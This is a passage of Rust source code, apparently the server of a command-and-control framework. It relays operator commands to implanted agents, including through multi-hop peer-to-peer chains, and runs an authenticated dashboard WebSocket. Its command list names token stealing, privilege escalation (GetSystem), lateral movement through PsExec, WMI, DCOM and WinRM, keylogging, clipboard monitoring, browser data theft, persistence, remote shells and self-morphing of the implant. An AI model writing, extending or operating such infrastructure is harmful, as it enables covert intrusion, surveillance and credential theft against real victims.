        blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        blob.extend_from_slice(&payload);
        payload = blob;
    }

    // Send the outermost P2pToChild to the directly-connected agent.
    let first_hop_agent_id = route[0].0.clone();
    let first_hop_entry = state
        .find_by_agent_id(&first_hop_agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "first-hop agent '{first_hop_agent_id}' is no longer connected"
            ),
        ))?;

    let first_link_id = route[0].1;
    let p2p_msg = Message::P2pToChild {
        child_link_id: first_link_id,
        data: payload,
    };

    if first_hop_entry.tx.send(p2p_msg).await.is_err() {
        state.audit.record_simple(
            &agent_id,
            &user.0,
            cmd_label_str,
            "P2P relay send failed — first hop disconnected",
            Outcome::Failure,
        );
        return Err((
            StatusCode::BAD_GATEWAY,
            "first-hop agent disconnected".into(),
        ));
    }

    state.audit.record_simple(
        &agent_id,
        &user.0,
        cmd_label_str,
        &format!(
            "command relayed via P2P chain ({} hops, first={})",
            route.len(),
            first_hop_agent_id
        ),
        Outcome::Success,
    );

    // For relayed commands we can't wait for a response (the child's
    // response would need to traverse the relay chain back).  Return
    // immediately with a "relayed" status.
    Ok(Json(CommandReply {
        task_id,
        outcome: "relayed",
        output: Some(format!(
            "command relayed to '{}' via {} hop(s)",
            agent_id,
            route.len()
        )),
        error: None,
    }))
}

async fn send_command_by_connection_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(connection_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state.find_by_connection_id(&connection_id).ok_or((
        StatusCode::NOT_FOUND,
        "no agent with that connection_id".into(),
    ))?;
    dispatch_command(state, user, entry, req).await
}

async fn dispatch_command(
    state: Arc<AppState>,
    user: AuthenticatedUser,
    entry: crate::state::AgentEntry,
    req: CommandRequest,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // Use the reported agent_id for audit and response labelling.
    let agent_id = entry.agent_id.clone();

    let task_id = uuid::Uuid::new_v4().to_string();
    let (tx, rx) = oneshot::channel();
    state.pending.insert(task_id.clone(), tx);

    let cmd_label = command_label(&req.command);
    let cmd_detail = serde_json::to_string(&req.command).unwrap_or_default();
    let is_morph_now = matches!(req.command, Command::MorphNow { .. });
    let connection_id = entry.connection_id.clone();

    let request = Message::TaskRequest {
        task_id: task_id.clone(),
        command: req.command,
        operator_id: Some(user.0.clone()),
    };

    if entry.tx.send(request).await.is_err() {
        state.pending.remove(&task_id);
        state
            .audit
            .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
    }

    let timeout = Duration::from_secs(state.command_timeout_secs);
    let result = tokio::time::timeout(timeout, rx).await;

    match result {
        Ok(Ok(Ok(output))) => {
            // If this was a MorphNow command, capture the .text hash from
            // the response and store it in the agent's entry.
            if is_morph_now {
                state.update_text_hash(&connection_id, &output);
                tracing::info!(
                    agent_id = %agent_id,
                    connection_id = %connection_id,
                    text_hash = %output,
                    "MorphNow completed — .text hash recorded"
                );
            }
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Success);
            Ok(Json(CommandReply {
                task_id,
                outcome: "ok",
                output: Some(output),
                error: None,
            }))
        }
        Ok(Ok(Err(err))) => {
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
            Ok(Json(CommandReply {
                task_id,
                outcome: "error",
                output: None,
                error: Some(err),
            }))
        }
        Ok(Err(_canceled)) => {
            state.pending.remove(&task_id);
            Err((
                StatusCode::INTERNAL_SERVER_ERROR,
                "response channel closed".into(),
            ))
        }
        Err(_elapsed) => {
            state.pending.remove(&task_id);
            state.audit.record_simple(
                &agent_id,
                &user.0,
                cmd_label,
                &format!("{cmd_detail} [timeout]"),
                Outcome::Failure,
            );
            Err((
                StatusCode::GATEWAY_TIMEOUT,
                "agent did not respond in time".into(),
            ))
        }
    }
}

fn command_label(c: &Command) -> &'static str {
    match c {
        Command::Ping => "Ping",
        Command::GetSystemInfo => "GetSystemInfo",
        Command::RunApprovedScript { .. } => "RunApprovedScript",
        Command::ListDirectory { .. } => "ListDirectory",
        Command::ReadFile { .. } => "ReadFile",
        Command::WriteFile { .. } => "WriteFile",
        Command::DeployModule { .. } => "DeployModule",
        Command::ExecutePlugin { .. } => "ExecutePlugin",
        Command::Shutdown => "Shutdown",
        Command::DiscoverNetwork => "DiscoverNetwork",
        Command::CaptureScreen => "CaptureScreen",
        Command::SimulateKey { .. } => "SimulateKey",
        Command::SimulateMouse { .. } => "SimulateMouse",
        Command::StartHciLogging => "StartHciLogging",
        Command::StopHciLogging => "StopHciLogging",
        Command::GetHciLogBuffer => "GetHciLogBuffer",
        Command::ReloadConfig => "ReloadConfig",
        Command::EnablePersistence => "EnablePersistence",
        Command::DisablePersistence => "DisablePersistence",
        Command::MigrateAgent { .. } => "MigrateAgent",
        Command::ListProcesses => "ListProcesses",
        Command::SetReencodeSeed { .. } => "SetReencodeSeed",
        Command::MorphNow { .. } => "MorphNow",
        Command::ListPlugins => "ListPlugins",
        Command::UnloadPlugin { .. } => "UnloadPlugin",
        Command::GetPluginInfo { .. } => "GetPluginInfo",
        Command::DownloadModule { .. } => "DownloadModule",
        Command::ExecutePluginBinary { .. } => "ExecutePluginBinary",
        Command::JobStatus { .. } => "JobStatus",
        Command::MakeToken { .. } => "MakeToken",
        Command::StealToken { .. } => "StealToken",
        Command::Rev2Self => "Rev2Self",
        Command::GetSystem => "GetSystem",
        Command::PsExec { .. } => "PsExec",
        Command::WmiExec { .. } => "WmiExec",
        Command::DcomExec { .. } => "DcomExec",
        Command::WinRmExec { .. } => "WinRmExec",
        Command::LinkAgents { .. } => "LinkAgents",
        Command::UnlinkAgent { .. } => "UnlinkAgent",
        Command::ListTopology => "ListTopology",
        Command::LinkTo { .. } => "LinkTo",
        Command::Unlink { .. } => "Unlink",
        Command::ListLinks => "ListLinks",
        Command::MeshConnect { .. } => "MeshConnect",
        Command::MeshDisconnect { .. } => "MeshDisconnect",
        Command::MeshKillSwitch => "MeshKillSwitch",
        Command::MeshQuarantine { .. } => "MeshQuarantine",
        Command::MeshClearQuarantine { .. } => "MeshClearQuarantine",
        Command::MeshSetCompartment { .. } => "MeshSetCompartment",
        Command::ExecuteAssembly { .. } => "ExecuteAssembly",
        Command::ExecuteBOF { .. } => "ExecuteBOF",
        Command::CreateShell { .. } => "CreateShell",
        Command::ShellInput { .. } => "ShellInput",
        Command::ShellClose { .. } => "ShellClose",
        Command::ShellList => "ShellList",
        Command::ShellResize { .. } => "ShellResize",
        Command::Screenshot { .. } => "Screenshot",
        Command::KeyloggerStart => "KeyloggerStart",
        Command::KeyloggerDump { .. } => "KeyloggerDump",
        Command::KeyloggerStop => "KeyloggerStop",
        Command::ClipboardMonitorStart { .. } => "ClipboardMonitorStart",
        Command::ClipboardMonitorDump { .. } => "ClipboardMonitorDump",
        Command::ClipboardMonitorStop => "ClipboardMonitorStop",
        Command::ClipboardGet => "ClipboardGet",
        Command::BrowserData { .. } => "BrowserData",
    }
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> axum::response::Response {
    // Browsers can't attach `Authorization` to a WebSocket handshake,
    // so the dashboard sends the bearer token as a subprotocol value
    // of the form `bearer.<token>`. Validate it here in constant time
    // before accepting the upgrade.
    let presented = headers
        .get(axum::http::header::SEC_WEBSOCKET_PROTOCOL)
        .and_then(|v| v.to_str().ok())
        .and_then(extract_bearer_subprotocol);

    let token = match presented {
        Some(t) => t,
        None => return (StatusCode::UNAUTHORIZED, "missing bearer subprotocol").into_response(),
    };

    use subtle::ConstantTimeEq;

    // 1. Try the multi-operator store.
    if let Some(operator_id) = state.authenticate_operator(&token) {
        let subprotocol = format!("bearer.{}", token);
        return ws
            .protocols([subprotocol])
            .on_upgrade(move |sock| ws_loop(sock, state, operator_id));
    }

    // 2. Fallback: legacy single admin token.
    let ok: bool = token.as_bytes().ct_eq(state.admin_token.as_bytes()).into();
    if !ok {
        return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
    }

    // Echo the chosen subprotocol back so the browser accepts the
    // upgrade (otherwise the handshake fails).
    let subprotocol = format!("bearer.{}", token);
    ws.protocols([subprotocol])
        .on_upgrade(move |sock| ws_loop(sock, state, "admin".into()))
}

fn extract_bearer_subprotocol(header: &str) -> Option<String> {
    header
        .split(',')
        .map(str::trim)
        .find_map(|p| p.strip_prefix("bearer.").map(|t| t.to_string()))
}

#[derive(Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
enum DashboardEvent {
    Agents { agents: Vec<AgentView>, ts: u64 },
    Audit { event: common::AuditEvent },
}

async fn ws_loop(mut socket: WebSocket, state: Arc<AppState>, operator_id: String) {
    let mut audit_rx = state.audit.subscribe();
    let mut tick = tokio::time::interval(Duration::from_secs(2));
    // Log the WebSocket connection with operator attribution.
    state.audit.record_simple(
        "",
        &operator_id,
        "WebSocketConnect",
        "dashboard websocket session opened",
        common::Outcome::Success,
    );
    // Send an initial snapshot.
    if send_snapshot(&mut socket, &state).await.is_err() {
        return;
    }
    loop {
        tokio::select! {
            _ = tick.tick() => {
                if send_snapshot(&mut socket, &state).await.is_err() { break; }
            }
            ev = audit_rx.recv() => {
                match ev {
                    Ok(event) => {
                        let payload = DashboardEvent::Audit { event };
                        if let Ok(text) = serde_json::to_string(&payload) {
                            if socket.send(WsMessage::Text(text)).await.is_err() { break; }
                        }
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => continue,
                    Err(_) => break,
                }
            }
            incoming = socket.recv() => {
                match incoming {
                    Some(Ok(WsMessage::Close(_))) | None => break,
                    Some(Ok(_)) => continue,
                    Some(Err(_)) => break,
                }
            }
        }
    }
}

async fn send_snapshot(socket: &mut WebSocket, state: &AppState) -> Result<(), axum::Error> {
    let payload = DashboardEvent::Agents {
        agents: state.list_agents(),
        ts: now_secs(),
    };
    let text = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".into());
    socket.send(WsMessage::Text(text)).await
}
